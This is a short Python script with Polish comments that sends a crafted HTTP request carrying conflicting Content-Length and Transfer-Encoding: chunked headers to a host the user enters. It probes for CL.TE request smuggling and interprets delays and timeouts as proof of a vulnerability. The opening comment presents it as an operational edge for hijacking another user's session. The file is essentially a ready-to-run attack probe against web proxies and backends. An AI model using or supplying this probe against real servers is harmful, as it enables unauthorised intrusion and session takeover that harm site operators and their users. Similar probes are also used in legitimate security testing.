import socket
import time

# TO JEST TWOJA PRZEWAGA OPERACYJNA.
# Twoje oko widzi błąd tam, gdzie automat widzi tylko "niepoprawny protokół".
# Jeśli to zadziała, możesz przejąć sesję innego użytkownika.

def probe_smuggling(target_host, target_port=80):
    """
    Sonda typu CL.TE / TE.CL.
    Szukamy rozbieżności w tym, jak proxy i backend liczą bajty.
    """
    
    # Payload zaprojektowany, by wywołać desynchronizację.
    # Frontend (Proxy) widzi Content-Length: 4 i wysyła wszystko do "0\r\n".
    # Backend widzi Transfer-Encoding: chunked i kończy czytanie na "0\r\n", 
    # zostawiając "X" w buforze dla następnego zapytania.
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "X" 
    )

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5) # Czas to kluczowa zmienna dla Twojego oka
        
        start_time = time.time()
        sock.connect((target_host, target_port))
        
        print(f"[*] [ANALIZA] Wysyłanie sondy na {target_host}...")
        sock.sendall(payload.encode())
        
        response = sock.recv(4096)
        end_time = time.time()
        
        duration = end_time - start_time
        
        print("-" * 30)
        print(f"[*] Czas odpowiedzi: {duration:.2f}s")
        print("[*] Odpowiedź serwera:")
        print(response.decode(errors='ignore')[:200]) # Podgląd nagłówków
        print("-" * 30)

        # INTERPRETACJA DLA TWOJEGO OKA:
        if duration >= 3.0:
            print("[!] ANALIZA: Serwer zaliczył opóźnienie (Time Delay).")
            print("[!] To sugeruje, że backend czekał na więcej danych w 'chunked' sesji.")
            print("[!] WNIOSEK: Wysokie prawdopodobieństwo luki SMUGGLING (CL.TE).")
        elif "400" in response.decode() or "500" in response.decode():
            print("[?] ANALIZA: Serwer odrzucił zapytanie błędnym statusem.")
            print("[?] To może oznaczać, że systemy po drodze nie zgadzają się co do długości.")
        else:
            print("[.] ANALIZA: Standardowa odpowiedź. System może być odporny lub wymaga innej techniki (TE.TE).")
            
    except socket.timeout:
        print("\n[!!!] TIMEOUT: To jest to! Serwer 'zawisł' na Twoim zmanipulowanym pakiecie.")
        print("[!!!] To niemal pewny dowód na podatność Request Smuggling.")
    except Exception as e:
        print(f"[!] Błąd połączenia: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    print("--- SMUGGLING ANALYZER ---")
    print("Wpisz hosta do audytu (np. 127.0.0.1):")
    h = input().strip()
    if h:
        probe_smuggling(h)